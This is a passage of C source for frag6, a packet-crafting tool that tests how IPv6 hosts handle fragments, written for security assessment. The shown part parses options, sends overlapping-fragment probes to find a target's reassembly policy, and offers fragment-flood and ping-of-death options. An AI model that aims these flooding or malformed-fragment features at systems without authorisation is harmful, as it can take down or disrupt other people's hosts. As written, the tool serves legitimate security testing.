/*
 * frag6: A security assessment tool that exploits potential flaws in the
 *        processing of IPv6 fragments
 *
 * Copyright (C) 2011-2013 Fernando Gont (fgont@si6networks.com)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 * 
 * Build with: gcc frag6.c -Wall -lpcap -lm -o frag6
 * 
 * This program has been tested to compile and run on: Debian GNU/Linux 6.0,
 * FreeBSD 9.0, NetBSD 5.1, OpenBSD 5.0, and Ubuntu 11.10.
 *
 * It requires that the libpcap library be installed on your system.
 *
 * Please send any bug reports to Fernando Gont <fgont@si6networks.com>
 */

#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <time.h>
#include <getopt.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <pcap.h>
#include <sys/types.h>
#include <sys/param.h>
#include <setjmp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <sys/socket.h>
#include <pwd.h>
#include <net/if.h>
#include <ifaddrs.h>
#ifdef __linux__
	#include <netpacket/packet.h>
#elif defined (__FreeBSD__) || defined(__NetBSD__) || defined (__OpenBSD__) || defined(__APPLE__)
	#include <net/if_dl.h>
#endif
#include <sys/select.h>
#include "frag6.h"
#include "ipv6toolkit.h"
#include <netinet/tcp.h>
#include <math.h>


/* Function prototypes */
int					init_iface_data(struct iface_data *);
int					insert_pad_opt(unsigned char *ptrhdr, const unsigned char *, unsigned int);
void 				print_icmp6_echo(struct pcap_pkthdr *, const u_char *);
void 				process_icmp6_echo(struct pcap_pkthdr *, const u_char *, unsigned char *, unsigned int *);
void 				print_icmp6_timed(struct pcap_pkthdr *, const u_char *);
void 				process_icmp6_timed(struct pcap_pkthdr *, const u_char *, unsigned char *);
int 				send_neighbor_advert(struct iface_data *, pcap_t *,  const u_char *);
void				print_attack_info(void);
void				usage(void);
void				print_help(void);
int					ether_pton(const char *, struct ether_addr *, unsigned int);
int					ether_ntop(const struct ether_addr *, char *, size_t);
u_int16_t			in_chksum(void *, void *, size_t, u_int8_t);
int					is_ip6_in_prefix_list(struct in6_addr *, struct prefix_list *);
unsigned int		match_ipv6(struct in6_addr *, u_int8_t *, unsigned int, struct in6_addr *);
unsigned int		match_ether(struct ether_addr *, unsigned int, struct ether_addr *);
void				sanitize_ipv6_prefix(struct in6_addr *, u_int8_t);
void				randomize_ipv6_addr(struct in6_addr *, struct in6_addr *, u_int8_t);
void				randomize_ether_addr(struct ether_addr *);
void				ether_to_ipv6_linklocal(struct ether_addr *etheraddr, struct in6_addr *ipv6addr);
void				generate_slaac_address(struct in6_addr *, struct ether_addr *, struct in6_addr *);
void				sig_alarm(int);
int					is_eq_in6_addr(struct in6_addr *, struct in6_addr *);
int					find_ipv6_router_full(pcap_t *, struct iface_data *);
int					ipv6_to_ether(pcap_t *, struct iface_data *, struct in6_addr *, struct ether_addr *);
struct in6_addr		solicited_node(const struct in6_addr *);
struct ether_addr	ether_multicast(const struct in6_addr *);
int 				match_ipv6_to_prefixes(struct in6_addr *, struct prefix_list *);
int					get_if_addrs(struct iface_data *);
struct in6_addr *	src_addr_sel(struct iface_data *, struct in6_addr *);
int 				valid_icmp6_response(struct iface_data *, struct pcap_pkthdr *, const u_char *);
int					valid_icmp6_response2(struct iface_data *, struct pcap_pkthdr *, const u_char *, unsigned int);
int 				send_fragment(unsigned int, unsigned int, unsigned int, unsigned int, unsigned int);
int 				send_fragment2(u_int16_t, unsigned int, unsigned int, unsigned int, unsigned int, char *);
int					send_fid_probe(void);
int					test_frag_pattern(unsigned char *, unsigned int, char *);
int					predict_frag_id(u_int32_t *, unsigned int, u_int32_t *, unsigned int);
int					inc_sdev(u_int32_t *, unsigned int, u_int32_t *, double *);
void				change_endianness(u_int32_t *, unsigned int);
int					send_neighbor_solicit(struct iface_data *);

/* Used for router discovery */
struct iface_data	idata;
struct prefix_entry	*prefix_ols[MAX_PREFIXES_ONLINK], *prefix_acs[MAX_PREFIXES_AUTO];
struct prefix_entry	*prefix_local[MAX_LOCAL_ADDRESSES];
struct in6_addr		randprefix;
unsigned char		randpreflen;

/* Data structures for packets read from the wire */
struct pcap_pkthdr	*pkthdr;
const u_char		*pktdata;
unsigned char		*pkt_end, *pkt_ptr;
struct ether_header	*pkt_ether;
struct ip6_hdr		*pkt_ipv6;
struct ip6_frag		*pkt_fh;
struct icmp6_hdr	*pkt_icmp6;
struct nd_neighbor_solicit *pkt_ns;
struct in6_addr		*pkt_ipv6addr;
unsigned int		pktbytes;


bpf_u_int32			my_netmask;
bpf_u_int32			my_ip;
struct bpf_program	pcap_filter;
char 				dev[64], errbuf[PCAP_ERRBUF_SIZE];
unsigned char		buffer[65556], buffrh[MIN_IPV6_HLEN + MIN_TCP_HLEN];
unsigned char		*v6buffer, *ptr, *startofprefixes;
char				*pref;
char 				iface[IFACE_LENGTH];
    
struct ip6_hdr		*ipv6;
struct icmp6_hdr	*icmp6;

struct ether_header	*ethernet;
struct dlt_null		*dlt_null;
struct ether_addr	hsrcaddr, hdstaddr;
struct nd_opt_tlla	*tllaopt;

struct in6_addr		srcaddr, dstaddr, targetaddr;
struct ether_addr	linkaddr[MAX_TLLA_OPTION];
unsigned int		nlinkaddr=0, linkaddrs;

char				*lasts, *rpref;
char				*charptr;

size_t				nw;
unsigned long		ul_res, ul_val;
unsigned int		i, j, startrand;
unsigned int		skip;
unsigned int		frags, nfrags, nsleep;
unsigned char		srcpreflen;

u_int16_t			mask, ip6length;
u_int8_t			hoplimit;

char 				plinkaddr[ETHER_ADDR_PLEN];
char 				psrcaddr[INET6_ADDRSTRLEN], pdstaddr[INET6_ADDRSTRLEN], pv6addr[INET6_ADDRSTRLEN];
unsigned char 		verbose_f=0, iface_f=0;
unsigned char 		srcaddr_f=0, dstaddr_f=0, hsrcaddr_f=0, hdstaddr_f=0, floodf_f=0;
unsigned char 		loop_f=0, sleep_f=0, localaddr_f=0, tstamp_f=1, pod_f;
unsigned char		srcprefix_f=0, hoplimit_f=0, ip6length_f=0, icmp6psize_f=0;
unsigned char		fsize_f=0, forder_f=0, foffset_f=0, fid_f=0, fragp_f=0, fragidp_f=0, resp_f=1;

u_int32_t			fsize, foffset, fid, id;
unsigned int		forder, overlap, minfragsize;

/* Support for Extension Headers */
unsigned int		dstopthdrs, dstoptuhdrs, hbhopthdrs;
char				hbhopthdr_f=0, dstoptuhdr_f=0, dstopthdr_f=0;
unsigned char		*dstopthdr[MAX_DST_OPT_HDR], *dstoptuhdr[MAX_DST_OPT_U_HDR];
unsigned char		*hbhopthdr[MAX_HBH_OPT_HDR];
unsigned int		dstopthdrlen[MAX_DST_OPT_HDR], dstoptuhdrlen[MAX_DST_OPT_U_HDR];
unsigned int		hbhopthdrlen[MAX_HBH_OPT_HDR], m, pad;

struct ip6_frag		*fh;
struct ip6_hdr		*fipv6;

unsigned char		*fragpart, *ptrend, *ptrhdr, *ptrhdrend;
unsigned int		hdrlen, ndstopthdr=0, nhbhopthdr=0, ndstoptuhdr=0;
unsigned int		nfrags, fragsize, max_packet_size, linkhsize;
unsigned char		*prev_nh, *startoffragment;


/* Basic data blocks used for detecting the fragment reassembly policy. They contain the same words
 * in different order, thus resulting in the same checksum
 */
#define				FRAG_BLOCK_SIZE 8
char				block1[8]={'a', 'a', 'b', 'b', 'c', 'c', 'd', 'd'};
char				block2[8]={'b', 'b', 'a', 'a', 'c', 'c', 'd', 'd'};
char				block3[8]={'c', 'c', 'a', 'a', 'b', 'b', 'd', 'd'};
char				block4[8]={'d', 'd', 'a', 'a', 'b', 'b', 'c', 'c'};
char				block5[8]={'d', 'd', 'c', 'c', 'b', 'b', 'a', 'a'};
char				block6[8]={'c', 'c', 'd', 'd', 'b', 'b', 'a', 'a'};
char				block7[8]={'b', 'b', 'd', 'd', 'c', 'c', 'a', 'a'};
char				block8[8]={'a', 'a', 'd', 'd', 'c', 'c', 'b', 'b'};


/* For the sampling of Fragment Identification values */
u_int16_t			addr_sig, addr_key;
u_int32_t			icmp6_sig;

/* IPv6 Address Resolution */
sigjmp_buf			env;
unsigned int		canjump;

int main(int argc, char **argv){
	extern char		*optarg;	
	char			*endptr; /* Used by strtoul() */
	uid_t			ruid;
	gid_t			rgid;
	struct passwd	*pwdptr;
	fd_set			sset, rset;
	struct timeval	timeout;
	int				r, sel;
	time_t			curtime, start, lastfrag=0, lastfrag1=0, lastfrag2=0;
	time_t			lastfrag3=0, lastfrag4=0, lastfrag5=0;
	unsigned int	responses=0, maxsizedchunk;

	/* Array for storing the Fragment reassembly policy test results */
	unsigned char	test[5];

	/* Arrays for storing the Fragment ID samples */
	u_int32_t		test1[NSAMPLES], test2[NSAMPLES];
	unsigned int	ntest1=0, ntest2=0;
	unsigned char	testtype;

	static struct option longopts[] = {
		{"interface", required_argument, 0, 'i'},
		{"link-src-addr", required_argument, 0, 'S'},
		{"link-dst-addr", required_argument, 0, 'D'},
		{"src-address", required_argument, 0, 's'},
		{"dst-address", required_argument, 0, 'd'},
		{"hop-limit", required_argument, 0, 'A'},
		{"dst-opt-hdr", required_argument, 0, 'u'},
		{"dst-opt-u-hdr", required_argument, 0, 'U'},
		{"hbh-opt-hdr", required_argument, 0, 'H'},
		{"frag-size", required_argument, 0, 'P'},
		{"frag-type", required_argument, 0, 'O'},
		{"frag-offset", required_argument, 0, 'o'},
		{"frag-id", required_argument, 0, 'I'},
		{"no-timestamp", no_argument, 0, 'T'},
		{"no-responses", no_argument, 0, 'n'},
		{"frag-reass-policy", no_argument, 0, 'p'},
		{"frag-id-policy", no_argument, 0, 'W'},
		{"pod-attack", no_argument, 0, 'X'},
		{"flood-frags", required_argument, 0, 'F'},
		{"loop", no_argument, 0, 'l'},
		{"sleep", required_argument, 0, 'z'},
		{"verbose", no_argument, 0, 'v'},
		{"help", no_argument, 0, 'h'}
	};

	char shortopts[]= "i:S:D:s:d:A:u:U:H:P:O:o:I:TnpWXF:lz:vh";

	char option;

	if(argc<=1){
		usage();
		exit(EXIT_FAILURE);
	}


	srandom(time(NULL));
	hoplimit=64+random()%180;
	init_iface_data(&idata);

	while((r=getopt_long(argc, argv, shortopts, longopts, NULL)) != -1) {
		option= r;

		switch(option) {

			case 'i':  /* Interface */
				strncpy(idata.iface, optarg, IFACE_LENGTH-1);
				iface_f=1;
				break;

			case 's':	/* IPv6 Source Address */
				if((charptr = strtok_r(optarg, "/", &lasts)) == NULL){
					puts("Error in Source Address");
					exit(EXIT_FAILURE);
				}

				if ( inet_pton(AF_INET6, charptr, &srcaddr) <= 0){
					puts("inet_pton(): Source Address not valid");
					exit(EXIT_FAILURE);
				}

				srcaddr_f = 1;
		
				if((charptr = strtok_r(NULL, " ", &lasts)) != NULL){
					srcpreflen = atoi(charptr);
		
					if(srcpreflen>128){
						puts("Prefix length error in IPv6 Source Address");
						exit(EXIT_FAILURE);
					}

					sanitize_ipv6_prefix(&srcaddr, srcpreflen);
					srcprefix_f=1;
				}

				break;
	    
			case 'd':	/* IPv6 Destination Address */
				if( inet_pton(AF_INET6, optarg, &dstaddr) <= 0){
					puts("inet_pton(): address not valid");
					exit(EXIT_FAILURE);
				}
		
				dstaddr_f = 1;
				break;

			case 'A':	/* Hop Limit */
				hoplimit= atoi(optarg);
				hoplimit_f=1;
				break;

			case 'u':	/* Destinations Options Header */
				if(ndstopthdr >= MAX_DST_OPT_HDR){
					puts("Too many Destination Options Headers");
					exit(EXIT_FAILURE);
				}

				hdrlen= atoi(optarg);
		
				if(hdrlen < 8){
					puts("Bad length in Destination Options Header");
					exit(EXIT_FAILURE);
				}
		    
				hdrlen = ((hdrlen+7)/8) * 8;
				dstopthdrlen[ndstopthdr]= hdrlen;

				if( (dstopthdr[ndstopthdr]= malloc(hdrlen)) == NULL){
					puts("Not enough memory for Destination Options Header");
					exit(EXIT_FAILURE);
				}

				ptrhdr= dstopthdr[ndstopthdr] + 2;
				ptrhdrend= dstopthdr[ndstopthdr] + hdrlen;

				while( ptrhdr < ptrhdrend){

					if( (ptrhdrend-ptrhdr)>257)
						pad= 257;
					else
						pad= ptrhdrend-ptrhdr;
			
					if(!insert_pad_opt(ptrhdr, ptrhdrend, pad)){
						puts("Destination Options Header Too Big");
						exit(EXIT_FAILURE);
					}
		    
					ptrhdr= ptrhdr + pad;
				}

				*(dstopthdr[ndstopthdr]+1)= (hdrlen/8)-1;
				ndstopthdr++;
				dstopthdr_f=1;
				break;

			case 'U':	/* Destination Options Header (Unfragmentable Part) */
				if(ndstoptuhdr >= MAX_DST_OPT_U_HDR){
					puts("Too many Destination Options Headers (Unfragmentable Part)");
					exit(EXIT_FAILURE);
				}

				hdrlen= atoi(optarg);
		
				if(hdrlen < 8){
					puts("Bad length in Destination Options Header (Unfragmentable Part)");
					exit(EXIT_FAILURE);
				}

				hdrlen = ((hdrlen+7)/8) * 8;
				dstoptuhdrlen[ndstoptuhdr]= hdrlen;
		
				if( (dstoptuhdr[ndstoptuhdr]= malloc(hdrlen)) == NULL){
					puts("Not enough memory for Destination Options Header (Unfragmentable Part)");
					exit(EXIT_FAILURE);
				}

				ptrhdr= dstoptuhdr[ndstoptuhdr]+2;
				ptrhdrend= dstoptuhdr[ndstoptuhdr] + hdrlen;
		
				while( ptrhdr < ptrhdrend){

					if( (ptrhdrend-ptrhdr)>257)
						pad= 257;
					else
						pad= ptrhdrend-ptrhdr;

					if(!insert_pad_opt(ptrhdr, ptrhdrend, pad)){
						puts("Destination Options Header (Unfragmentable Part) Too Big");
						exit(EXIT_FAILURE);
					}

					ptrhdr = ptrhdr + pad;
				}

				*(dstoptuhdr[ndstoptuhdr]+1)= (hdrlen/8) - 1;
				ndstoptuhdr++;
				dstoptuhdr_f=1;
				break;

			case 'H':	/* Hop-by-Hop Options Header */
				if(nhbhopthdr >= MAX_HBH_OPT_HDR){
					puts("Too many Hop-by-Hop Options Headers");
					exit(EXIT_FAILURE);
				}

				hdrlen= atoi(optarg);
		
				if(hdrlen <= 8){
					puts("Bad length in Hop-by-Hop Options Header");
					exit(EXIT_FAILURE);
				}
		    
				hdrlen = ((hdrlen+7)/8) * 8;
				hbhopthdrlen[nhbhopthdr]= hdrlen;
		
				if( (hbhopthdr[nhbhopthdr]= malloc(hdrlen)) == NULL){
					puts("Not enough memory for Hop-by-Hop Options Header");
					exit(EXIT_FAILURE);
				}

				ptrhdr= hbhopthdr[nhbhopthdr] + 2;
				ptrhdrend= hbhopthdr[nhbhopthdr] + hdrlen;
		
		
				while( ptrhdr < ptrhdrend){

					if( (ptrhdrend-ptrhdr)>257)
						pad= 257;
					else
						pad= ptrhdrend-ptrhdr;

					if(!insert_pad_opt(ptrhdr, ptrhdrend, pad)){
						puts("Hop-by-Hop Options Header Too Big");
						exit(EXIT_FAILURE);
					}

					ptrhdr = ptrhdr + pad;
				}

				*(hbhopthdr[nhbhopthdr]+1)= (hdrlen/8) - 1;
				nhbhopthdr++;
				hbhopthdr_f=1;
				break;

			case 'S':	/* Source Ethernet address */
				if(ether_pton(optarg, &hsrcaddr, sizeof(hsrcaddr)) == 0){
					puts("Error in Source link-layer address.");
					exit(EXIT_FAILURE);
				}
		
				hsrcaddr_f = 1;
				break;

			case 'D':	/* Destination Ethernet Address */
				if(ether_pton(optarg, &hdstaddr, sizeof(hdstaddr)) == 0){
					puts("Error in Source link-layer address.");
					exit(EXIT_FAILURE);
				}
		
				hdstaddr_f = 1;
				break;

			case 'P':	/* Fragment Size*/
				fsize= atoi(optarg);
				fsize_f= 1;
				break;

			case 'O':	/* Fragment Type */
				if(strncmp(optarg, "first", MAX_STRING_SIZE) == 0){
					forder= FIRST_FRAGMENT;
					forder_f=1;
				}
				else if(strncmp(optarg, "last", MAX_STRING_SIZE) == 0){
					forder= LAST_FRAGMENT;
					forder_f=1;
				}
				else if(strncmp(optarg, "middle", MAX_STRING_SIZE) == 0){
					forder= MIDDLE_FRAGMENT;
					forder_f=1;
				}
				else if(strncmp(optarg, "atomic", MAX_STRING_SIZE) == 0){
					forder= ATOMIC_FRAGMENT;
					forder_f=1;
				}
				else{
					puts("Unknown fragment order (valid order types: 'first', 'last', 'middle')");
					exit(EXIT_FAILURE);
				}

				break;

			case 'o':	/* Fragment Offset */
				if((ul_res = strtoul(optarg, &endptr, 0)) == ULONG_MAX){
					perror("Error in 'Fragment Offset' parameter");
					exit(EXIT_FAILURE);
				}
		
				if(endptr != optarg){
					foffset = ul_res;
					foffset_f=1;
				}

				break;

			case 'I':	/* Fragment Identification */
				if((ul_res = strtoul(optarg, &endptr, 0)) == ULONG_MAX){
					perror("Error in 'Fragment Identification' parameter");
					exit(EXIT_FAILURE);
				}
		
				if(endptr != optarg){
					fid = ul_res;
					fid_f=1;
				}

				break;

			case 'T': /* Do not include timestamp in fragment */
				tstamp_f=0;
				break;

			case 'n': /* Do not show responses */
				resp_f=0;
				break;

			case 'p':	/* Assess the fragment reassembly policy of the target */
				fragp_f= 1;
				break;

			case 'W':	/* Assess the fragment id generation policy of the target */
				fragidp_f= 1;
				break;

			case 'F':	/* Flood target with fragments */
				nfrags= atoi(optarg);
				if(nfrags == 0){
					puts("Invalid number of fragments in option -F");
					exit(EXIT_FAILURE);
				}
		
				floodf_f= 1;
				break;

			case 'X':
				pod_f=1;
				break;

			case 'l':	/* "Loop mode */
				loop_f = 1;
				break;

			case 'z':	/* Sleep option */
				nsleep=atoi(optarg);
				if(nsleep==0){
					puts("Invalid number of seconds in '-z' option");
					exit(EXIT_FAILURE);
				}
	
				sleep_f=1;
				break;

			case 'v':	/* Be verbose */
				verbose_f++;
				break;
		
			case 'h':	/* Help */
				print_help();
		
				exit(EXIT_FAILURE);
				break;

			default:
				usage();
				exit(EXIT_FAILURE);
				break;
		
		} /* switch */
	} /* while(getopt) */

	if(geteuid()) {
		puts("frag6 needs root privileges to run.");
		exit(EXIT_FAILURE);
	}

	if(!iface_f){
		puts("Must specify the network interface with the -i option");
		exit(EXIT_FAILURE);
	}

	if( (idata.pd = pcap_open_live(idata.iface, PCAP_SNAP_LEN, PCAP_PROMISC, PCAP_TIMEOUT, errbuf)) == NULL){
		printf("pcap_open_live(): %s\n", errbuf);
		exit(EXIT_FAILURE);
	}

	/* 
	   If the real UID is not root, we setuid() and setgid() to that user and group, releasing superuser
	   privileges. Otherwise, if the real UID is 0, we try to setuid() to "nobody", releasing superuser 
	   privileges.
	 */
	if( (ruid=getuid()) && (rgid=getgid())){
		if(setgid(rgid) == -1){
			puts("Error while releasing superuser privileges (changing to real GID)");
			exit(EXIT_FAILURE);
		}

		if(setuid(ruid) == -1){
			puts("Error while releasing superuser privileges (changing to real UID)");
			exit(EXIT_FAILURE);
		}
	}
	else{
		if((pwdptr=getpwnam("nobody"))){
			if(!pwdptr->pw_uid || !pwdptr->pw_gid){
				puts("User 'nobody' has incorrect privileges");
				exit(EXIT_FAILURE);
			}

			if(setgid(pwdptr->pw_gid) == -1){
				puts("Error while releasing superuser privileges (changing to nobody's group)");
				exit(EXIT_FAILURE);
			}

			if(setuid(pwdptr->pw_uid) == -1){
				puts("Error while releasing superuser privileges (changing to 'nobody')");
				exit(EXIT_FAILURE);
			}
		}
	}

	if( (idata.type = pcap_datalink(idata.pd)) == DLT_EN10MB){
		linkhsize= ETH_HLEN;
		idata.mtu= ETH_DATA_LEN;
	}
	else if( idata.type == DLT_RAW){
		linkhsize=0;
		idata.mtu= MIN_IPV6_MTU;
		idata.flags= IFACE_TUNNEL;
	}
	else if(idata.type == DLT_NULL){
		linkhsize=4;
		idata.mtu= MIN_IPV6_MTU;
		idata.flags= IFACE_TUNNEL;
	}
	else{
		printf("Error: Interface %s is not an Ethernet or tunnel interface", iface);
		exit(EXIT_FAILURE);
	}

	if((idata.ip6_local_flag && idata.ip6_global_flag) && !srcaddr_f)
		localaddr_f=1;

	if(!idata.ether_flag){
		randomize_ether_addr(&idata.ether);
		idata.ether_flag=1;
	}

	if(!hsrcaddr_f)
		hsrcaddr=idata.ether;

	if(!idata.ip6_local_flag){
		ether_to_ipv6_linklocal(&idata.ether, &idata.ip6_local);
	}

	/*
	   Select link-layer destination address

	   + If the underlying interface is loopback or tunnel, there is no need 
	     to select a link-layer destination address
	   + If a link-layer Destination Address has been specified, we do not need to
	     select one
	   + If the destination address is link-local, there is no need to perform
	     next-hop determination
	   + Otherwise we need to learn the local router or do ND as a last ressort
	 */
	if((idata.type == DLT_EN10MB && idata.flags != IFACE_LOOPBACK) && (!hdstaddr_f && dstaddr_f)){
		if(IN6_IS_ADDR_LINKLOCAL(&dstaddr)){
			/*
			   If the IPv6 Destination Address is a multicast address, there is no need
			   to perform Neighbor Discovery
			 */
			if(IN6_IS_ADDR_MC_LINKLOCAL(&dstaddr)){
				hdstaddr= ether_multicast(&dstaddr);
			}
			else if(ipv6_to_ether(idata.pd, &idata, &dstaddr, &hdstaddr) != 1){
				puts("Error while performing Neighbor Discovery for the Destination Address");
				exit(EXIT_FAILURE);
			}
		}
		else if(find_ipv6_router_full(idata.pd, &idata) == 1){
			if(match_ipv6_to_prefixes(&dstaddr, &idata.prefix_ol)){
				/* If address is on-link, we must perform Neighbor Discovery */
				if(ipv6_to_ether(idata.pd, &idata, &dstaddr, &hdstaddr) != 1){
					puts("Error while performing Neighbor Discovery for the Destination Address");
					exit(EXIT_FAILURE);
				}
			}
			else{
				hdstaddr= idata.router_ether;
			}
		}
		else{
			if(verbose_f)
				puts("Couldn't find local router. Now trying Neighbor Discovery for the target node");
			/*
			 * If we were not able to find a local router, we assume the destination is "on-link" (as
			 * a last ressort), and thus perform Neighbor Discovery for that destination
			 */
			if(ipv6_to_ether(idata.pd, &idata, &dstaddr, &hdstaddr) != 1){
				puts("Error while performing Neighbor Discovery for the Destination Address");
				exit(EXIT_FAILURE);
			}
		}
	}

	if(srcprefix_f){
		randprefix=srcaddr;
		randpreflen=srcpreflen;
		randomize_ipv6_addr(&srcaddr, &randprefix, randpreflen);
		srcaddr_f=1;
	}
	else if(!srcaddr_f){
		srcaddr= *src_addr_sel(&idata, &dstaddr);
	}

	if(!sleep_f)
		nsleep=QUERY_TIMEOUT;

	max_packet_size = MAX_IPV6_PAYLOAD + MIN_IPV6_HLEN;

	if(verbose_f){
		print_attack_info();
	}

	if(!dstaddr_f){
		puts("Error: Nothing to send! (Destination Address left unspecified)");
		exit(EXIT_FAILURE);
	}

	if(!floodf_f)
		nfrags=1;

	if(!forder_f)
		forder= MIDDLE_FRAGMENT;

	/* Assess the Fragment Reassembly policy */
	if(fragp_f){
		puts("Identifying fragment reassembly policy of the target node....");

		/*
		   Set filter for receiving Neighbor Solicitations, ICMPv6 Echo Responses, and ICMPv6 Time Exceeded
		 */
		if(pcap_compile(idata.pd, &pcap_filter, PCAP_ICMPV6_NSECHOEXCEEDED_FILTER, PCAP_OPT, PCAP_NETMASK_UNKNOWN) == -1){
			printf("pcap_compile(): %s", pcap_geterr(idata.pd));
			exit(EXIT_FAILURE);
		}
		
		if(pcap_setfilter(idata.pd, &pcap_filter) == -1){
			printf("pcap_setfilter(): %s", pcap_geterr(idata.pd));
			exit(EXIT_FAILURE);
		}

		pcap_freecode(&pcap_filter);

		/* Initialize the table of results for the different tests */
		for(i=0; i<5; i++)
			test[i]= TIMED_OUT;

		/*
		   These two variables select the fragment "overlap" size for the tests, and the minimum fragment size.
		   They are currently hardcoded, but will be configurable in future revisions of the tool.
		 */
		overlap=8;
		minfragsize= 8*10;

		/*
		   Since the current version of the tool does not reassemble response packets, we need to prevent
		   response packets from employing fragmentation. The maximum-sized packets that we send is composed
		   of a 4*minfragsize payload plus IPv6 and ICMPv6 headers -- hence the check bellow.
		 */
		if(minfragsize > ((idata.mtu - sizeof(struct ip6_hdr) - sizeof(struct icmp6_hdr))/4)){
			puts("Error: minimum fragment size is too large");
			exit(EXIT_FAILURE);
		}

		if(overlap < 8 || (overlap%8) != 0 || overlap >= minfragsize){
			puts("Error: Incorrect 'overlap' value");
			exit(EXIT_FAILURE);
		}

		if( (idata.fd= pcap_fileno(idata.pd)) == -1){
			puts("Error obtaining descriptor number for pcap_t");
			exit(EXIT_FAILURE);
		}

		FD_ZERO(&sset);
		FD_SET(idata.fd, &sset);
		start= time(NULL);
		lastfrag1= start - QUERY_TIMEOUT/2;
		lastfrag2= start - QUERY_TIMEOUT/2 + 1;
		lastfrag3= start - QUERY_TIMEOUT/2 + 2;
		lastfrag4= start - QUERY_TIMEOUT/2 + 3;
		lastfrag5= start - QUERY_TIMEOUT/2 + 4;
		responses=0;

		while(1){
			curtime=time(NULL);

			if((curtime - start) >= QUERY_TIMEOUT || responses >= 5){
				break;
			}

			if((curtime - lastfrag1) >= QUERY_TIMEOUT/2 && (test[0]== TIMED_OUT || test[0]==TIME_EXCEEDED)){
				if(verbose_f)
					puts("Sending Fragments for Test #1....");

				id= random();

				if(send_fragment2(sizeof(struct icmp6_hdr)+minfragsize*2-overlap, id, 0, minfragsize, \
									FIRST_FRAGMENT, block1) == -1){
				}

				if(send_fragment2(0, id, sizeof(struct icmp6_hdr)+minfragsize-overlap, minfragsize, \
									LAST_FRAGMENT, block6) == -1){
				}

				lastfrag1=curtime;
				continue;
			}

			if((curtime - lastfrag2) >= QUERY_TIMEOUT/2 && (test[1]== TIMED_OUT || test[1]==TIME_EXCEEDED)){
				if(verbose_f)
					puts("Sending Fragments for Test #2....");

				id= random();

				if(send_fragment2(sizeof(struct icmp6_hdr)+minfragsize * 3-overlap, id, 0, minfragsize, \
									FIRST_FRAGMENT, block2) == -1){
				}

				if(send_fragment2(0, id, sizeof(struct icmp6_hdr)+minfragsize * 2-overlap, minfragsize, \
									LAST_FRAGMENT, block6) == -1){
				}

				if(send_fragment2(0, id, sizeof(struct icmp6_hdr)+minfragsize-overlap, minfragsize, \
									MIDDLE_FRAGMENT, block7) == -1){
				}

				lastfrag2=curtime;
				continue;
			}

			if((curtime - lastfrag3) >= QUERY_TIMEOUT/2 && (test[2]== TIMED_OUT || test[2]==TIME_EXCEEDED)){
				if(verbose_f)
					puts("Sending Fragments for Test #3....");

				id= random();

				if(send_fragment2(sizeof(struct icmp6_hdr)+minfragsize * 3-overlap, id, 0, minfragsize, \
									FIRST_FRAGMENT, block3) == -1){
				}

				if(send_fragment2(0, id, sizeof(struct icmp6_hdr)+minfragsize * 2-overlap, minfragsize, \
									LAST_FRAGMENT, block6) == -1){
				}

				if(send_fragment2(0, id, sizeof(struct icmp6_hdr)+minfragsize, minfragsize, MIDDLE_FRAGMENT, \
									block7) == -1){
				}

				lastfrag3=curtime;
				continue;
			}


			if((curtime - lastfrag4) >= QUERY_TIMEOUT/2 && (test[3]== TIMED_OUT || test[3]==TIME_EXCEEDED)){
				if(verbose_f)
					puts("Sending Fragments for Test #4....");

				id= random();

				if(send_fragment2(sizeof(struct icmp6_hdr)+minfragsize *4, id, 0, minfragsize, FIRST_FRAGMENT, \
									block4) == -1){
				}

				if(send_fragment2(0, id, sizeof(struct icmp6_hdr)+minfragsize * 2, minfragsize, MIDDLE_FRAGMENT, \
									block6) == -1){
				}

				if(send_fragment2(0, id, sizeof(struct icmp6_hdr)+minfragsize, minfragsize *3, LAST_FRAGMENT, \
									block7) == -1){
				}

				lastfrag4=curtime;
				continue;
			}


			if((curtime - lastfrag5) >= QUERY_TIMEOUT/2 && (test[4]== TIMED_OUT || test[4]==TIME_EXCEEDED)){
				if(verbose_f)
					puts("Sending Fragments for Test #5....");

				id= random();

				if(send_fragment2(sizeof(struct icmp6_hdr)+minfragsize * 4 - overlap, id, 0, minfragsize, \
									FIRST_FRAGMENT, block5) == -1){
					puts("Error when writing fragment");
					exit(EXIT_FAILURE);
				}

				if(send_fragment2(0, id, sizeof(struct icmp6_hdr)+minfragsize * 2, minfragsize, MIDDLE_FRAGMENT, \
									block6) == -1){
					puts("Error when writing fragment");
					exit(EXIT_FAILURE);
				}

				if(send_fragment2(0, id, sizeof(struct icmp6_hdr)+minfragsize * 3 - overlap, minfragsize, \
									LAST_FRAGMENT, block7) == -1){
					puts("Error when writing fragment");
					exit(EXIT_FAILURE);
				}

				if(send_fragment2(0, id, sizeof(struct icmp6_hdr)+minfragsize, minfragsize, MIDDLE_FRAGMENT, \
									block8) == -1){
					puts("Error when writing fragment");
					exit(EXIT_FAILURE);
				}

				lastfrag5=curtime;
			}

			rset= sset;
			timeout.tv_usec=0;
			timeout.tv_sec= 1;

			if((sel=select(idata.fd+1, &rset, NULL, NULL, &timeout)) == -1){
				if(errno == EINTR){
					continue;
				}
				else{
					puts("Error in select()");
					exit(EXIT_FAILURE);
				}
			}

			if(sel == 0)
				continue;

			/* Read a packet (Echo Reply, ICMPv6 Error, or Neighbor Solicitation) */
			if((r=pcap_next_ex(idata.pd, &pkthdr, &pktdata)) == -1){
				printf("pcap_next_ex(): %s", pcap_geterr(idata.pd));
				exit(EXIT_FAILURE);
			}
			else if(r == 0){
				continue; /* Should never happen */
			}

			pkt_ether = (struct ether_header *) pktdata;
			pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + linkhsize);
			pkt_icmp6 = (struct icmp6_hdr *) ((char *) pkt_ipv6 + sizeof(struct ip6_hdr));
			pkt_ns= (struct nd_neighbor_solicit *) pkt_icmp6;
			pkt_end = (unsigned char *) pktdata + pkthdr->caplen;

			if( (pkt_end -  pktdata) < (linkhsize + MIN_IPV6_HLEN))
				continue;

